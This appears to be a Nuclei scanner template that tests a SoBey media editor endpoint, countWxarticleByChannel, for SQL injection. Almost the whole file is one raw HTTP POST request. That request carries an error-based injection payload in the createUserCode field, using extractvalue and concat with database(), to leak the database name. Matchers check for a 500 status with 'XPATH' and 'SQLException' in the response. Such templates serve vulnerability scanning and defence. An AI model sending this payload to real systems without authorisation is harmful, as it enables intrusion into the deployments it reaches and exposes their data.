id: SoBey-countWxarticleByChannel-sqlInjection

info:
  name: SoBey-countWxarticleByChannel-sqlInjection
  author: iSee857
  severity: high
  description: |
    SoBey-countWxarticleByChannel-sqlInjection
  tags: sql,xpath,injection

http:
  - raw:
      - |
        POST /sobey-mchEditor/mch/statistics/js/../countWxarticleByChannel HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0

        createUserCode=1'+and+extractvalue(1,concat(0x7e,database()))+and '1'='1-+-&token=1&siteCode=1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "XPATH"
          - "SQLException"
        condition: and